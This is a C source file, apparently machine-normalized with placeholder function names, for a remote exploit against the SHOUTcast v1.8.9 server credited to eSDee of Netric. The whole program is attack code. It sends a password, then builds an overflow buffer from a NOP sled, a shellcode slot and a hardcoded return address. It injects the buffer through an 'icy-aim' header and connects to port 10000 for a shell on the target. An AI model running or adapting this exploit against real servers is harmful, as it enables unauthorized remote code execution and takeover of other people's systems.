#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  pass ;
typedef  int /*<<< orphan*/  host ;
typedef  int /*<<< orphan*/  buf2 ;
typedef  int /*<<< orphan*/  buf1 ;

/* Variables and functions */
 int EOF ; 
 int FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC4 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int) ; 
 int FUNC6 (char*,int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC7 () ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int sock ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (int,char*,int) ; 

int
FUNC14 (int argc,char *argv[])
{
        char buf1[1130];
        char buf2[1800];
        char host[256];
        char pass[256]="changeme";

        int i=0;
        int c=0;
        int port=8001;
        unsigned int ret = 0x08069687;

        FUNC3(stdout,"SHOUTcast v1.8.9 remote exploit by eSDee of Netric\n");
        FUNC3(stdout,"-----------------------------------(www.netric.org)\n");

        while((c=FUNC4(argc,argv,"t:p:a:")) !=EOF)
        {
                switch(c)
                {
                        case 'p':
                                port=FUNC0(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        FUNC3(stderr,"Invalid port.\n\n");
                                        FUNC2(1);
                                }
                                break;
                        case 'a':
                                FUNC5(pass,0x0,sizeof(pass));
                                FUNC11(pass,optarg,sizeof(pass) - 1);
                                break;
                        case 't':
                                FUNC5(host,0x0,sizeof(host));
                                FUNC11(host,optarg,sizeof(host) - 1);
                                break;
                        default:
                                FUNC12(argv[0]);
                                FUNC2(1);
                                break;
                }
        }


        if (FUNC10(host) == 0) {
                FUNC12(argv[0]);
                FUNC2(1);
        }
        sock=FUNC6(host, port);

        if (sock==-1) {
                FUNC3(stderr,"- Unable to connect.\n\n");
                FUNC2(1);
        }

        FUNC13(sock, pass, FUNC10(pass));
        FUNC13(sock, "\n", 1);

        FUNC5(buf2,  0x0, sizeof(buf2));
        FUNC5(buf1, 0x90, sizeof(buf1));

        for(i=0;i < FUNC10(shellcode); i++) buf1[i+600] = shellcode[i];

        buf1[759] = (ret & 0x000000ff);
        buf1[760] = (ret & 0x0000ff00) >> 8;
        buf1[761] = (ret & 0x00ff0000) >> 16;
        buf1[762] = (ret & 0xff000000) >> 24;

        buf1[1120] = 0x0;

        FUNC9(buf2,   "icy-name: netric\r\n"
                        "icy-aim: %s\r\n"
                        "\r\n", buf1);

        FUNC3(stdout, "Connected, sending code...\n");
        FUNC3(stdout, "Ret: 0x%08x\n", ret);

        FUNC13(sock, buf2, FUNC10(buf2));
        FUNC8(2);
        FUNC1(sock);

        sock=FUNC6(host, 10000);

        if (sock==-1) {
                FUNC3(stderr, "Exploit failed!\n\n");
                FUNC2(1);
        }

        FUNC3(stdout, "Exploiting succesful.\n");
        FUNC3(stdout, "---------------------------------------------------\n");
        FUNC7();
        return 0;
}